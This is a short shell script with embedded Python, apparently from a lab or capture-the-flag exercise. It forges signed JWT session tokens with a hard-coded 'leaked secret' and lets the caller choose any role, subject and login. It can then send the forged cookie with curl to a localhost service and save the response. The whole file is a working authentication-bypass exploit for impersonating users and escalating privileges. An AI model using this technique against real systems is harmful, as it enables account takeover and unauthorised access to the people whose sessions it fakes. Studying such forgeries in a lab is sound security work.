#!/bin/sh
# Forges a session JWT signed with the leaked secret "42network" (see notas.md).
# Usage: ./forge_jwt.sh [role] [sub] [login] [target_path]
#   role        defaults to "cadet"
#   sub         defaults to z4p1cnx47mfy50f (jdoe)
#   login       defaults to "jdoe"
#   target_path if set, curls http://localhost:4942/<target_path> with the forged cookie

ROLE="${1:-cadet}"
SUB="${2:-z4p1cnx47mfy50f}"
LOGIN="${3:-jdoe}"
TARGET="$4"
SECRET="42network"

TOKEN=$(python3 - "$ROLE" "$SUB" "$LOGIN" "$SECRET" <<'EOF'
import sys, json, time, hmac, hashlib, base64

role, sub, login, secret = sys.argv[1:5]

def b64url(data: bytes) -> bytes:
    return base64.urlsafe_b64encode(data).rstrip(b"=")

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": sub, "login": login, "role": role, "exp": int(time.time()) + 3600}

h_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
p_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
signing_input = h_b64 + b"." + p_b64
sig_b64 = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())

print((signing_input + b"." + sig_b64).decode())
EOF
)

echo "$TOKEN"

if [ -n "$TARGET" ]; then
	curl -s -D - -o /tmp/forged_response.html -b "session=$TOKEN" "http://localhost:4942/$TARGET" | head -5
	echo "body saved to /tmp/forged_response.html"
fi
